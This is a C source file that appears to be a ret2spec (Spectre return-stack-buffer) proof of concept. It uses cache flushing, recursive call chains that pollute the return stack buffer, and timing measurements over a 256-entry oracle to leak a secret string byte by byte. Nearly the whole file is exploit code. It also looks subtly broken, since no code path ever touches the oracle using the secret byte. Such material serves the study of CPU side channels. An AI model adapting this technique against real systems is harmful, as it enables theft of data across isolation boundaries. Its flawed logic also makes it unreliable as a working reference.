// Combined ret2spec C file
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include "asm/measurereadlatency.h"  

// Cache line and page size (used for alignment and flushing)
#define CACHE_LINE_SIZE 64
#define PAGE_SIZE 4096
#define ORACLE_SIZE 256          // One oracle entry per possible byte value
#define MAX_RUNS 100000          // Maximum leak attempts before giving up
#define K_RECURSION_DEPTH 30     // Depth of recursive calls to fill/underflow the RSB

// Oracle byte array aligned to cache lines for each byte value
typedef struct {
    uint8_t byte[CACHE_LINE_SIZE];  // One cache line per possible byte value
} BigByte;

typedef struct {
    BigByte oracles_[ORACLE_SIZE];  // 256 aligned cache-line entries
} OracleArray;

// Global oracle array used to trigger timing effects
static OracleArray oracle;

// Score array to accumulate timing hits for each byte candidate
static int scores[ORACLE_SIZE] = {0};

// Pointer to the secret we want to leak
extern const char *private_data;
size_t current_offset;  // Index of the byte we want to leak from private_data

// Forward declarations (actual implementations are likely in assembly)
void FlushDataCacheLineNoBarrier(const void *addr);
void MemoryAndSpeculationBarrier();
void ForceRead(const void *addr);

// Flush a range of memory from the data cache line-by-line
void FlushFromDataCache(const void *start, const void *end) {
    const uintptr_t begin = (uintptr_t)start;
    const uintptr_t stop = (uintptr_t)end;
    for (uintptr_t p = begin; p < stop; p += CACHE_LINE_SIZE) {
        FlushDataCacheLineNoBarrier((const void*)p);  // Flush each line
    }
    MemoryAndSpeculationBarrier();  // Prevent reordering
}

// Flush the oracle array to prime the cache for timing detection
void FlushOracle() {
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        FlushDataCacheLineNoBarrier(&oracle.oracles_[i]);
    }
    MemoryAndSpeculationBarrier();
}

// Measure which oracle entry was accessed (i.e., leaked) based on timing
char RecomputeScores(char safe_char) {
    uint64_t latencies[ORACLE_SIZE] = {0};

    // Access oracle in pseudo-random order to prevent prefetching artifacts
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        int mix_i = (i * 167 + 13) & 0xFF;
        latencies[mix_i] = MeasureReadLatency(&oracle.oracles_[mix_i]);
    }

    // Use safe_char (which was speculatively accessed) as baseline latency
    uint64_t safe_latency = latencies[(unsigned char)safe_char];
    int best = -1, best_score = 0;

    // Accumulate scores for any byte that was faster (i.e., in cache)
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        if (latencies[i] < safe_latency && i != (unsigned char)safe_char) {
            scores[i]++;
            if (scores[i] > best_score) {
                best_score = scores[i];
                best = i;
            }
        }
    }

    return (char)best;  // Return best guess for leaked byte
}

// Global state for controlling speculative function execution
bool false_value = 0;
void (*return_true_base_case)();     // Normally a NOP
void (*return_false_base_case)();    // Starts the RSB overwrite

// Stack marks to track addresses in recursive calls for flushing
char *stack_marks[256];
int stack_index = 0;

// Function that never returns true — used to pollute the RSB
void ReturnsFalse(int depth) {
    if (depth > 0) {
        ReturnsFalse(depth - 1);  // Recurse to fill RSB
    } else {
        return_true_base_case();  // Triggers speculative return
    }
}

// Function that always returns true — mispredicted to call ReturnsFalse
void ReturnsTrue(int depth) {
    char mark;  // Local variable to mark this stack frame
    stack_marks[stack_index++] = &mark;

    if (depth > 0) {
        ReturnsTrue(depth - 1);  // Recurse
    } else {
        return_false_base_case();  // Deepest call starts the false path
    }

    // On return, flush stack region between current and previous mark
    stack_index--;
    FlushFromDataCache(&mark, stack_marks[stack_index]);
}

// Attempt to leak one byte via speculative return and cache timing
char Ret2SpecLeakByte() {
    for (int run = 0; run < MAX_RUNS; ++run) {
        FlushOracle();  // Clear oracle from cache

        // Stack mark to prevent reading uninitialized stack_marks[0]
        char mark;
        stack_marks[0] = &mark;
        stack_index = 1;

        ReturnsTrue(K_RECURSION_DEPTH);  // Fill RSB with ReturnsTrue

        stack_index = 0;  // Reset after recursion unwinds

        // Recompute which byte was cached speculatively
        char leaked = RecomputeScores((char)(run & 0xFF));
        if (scores[(unsigned char)leaked] > 3) {
            return leaked;  // If high enough confidence, return byte
        }
    }

    // If too many failed attempts, give up
    fprintf(stderr, "Failed to converge\n");
    exit(1);
}

// No-op function used as base case in ReturnsFalse
void NopFunction() {}

// Triggers ReturnsFalse recursion chain
void ReturnsFalseStart() {
    ReturnsFalse(K_RECURSION_DEPTH);
}

// The secret to be leaked (normally inaccessible)
const char *private_data = "It's a s3kr3t!!!";


int main() {
    // Initialize function pointers
    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseStart;

    printf("Leaking secret: ");
    for (size_t i = 0; i < strlen(private_data); ++i) {
        current_offset = i;
        char c = Ret2SpecLeakByte();
        printf("%c", c);
        fflush(stdout);
    }

    printf("\nDone.\n");
    return 0;
}
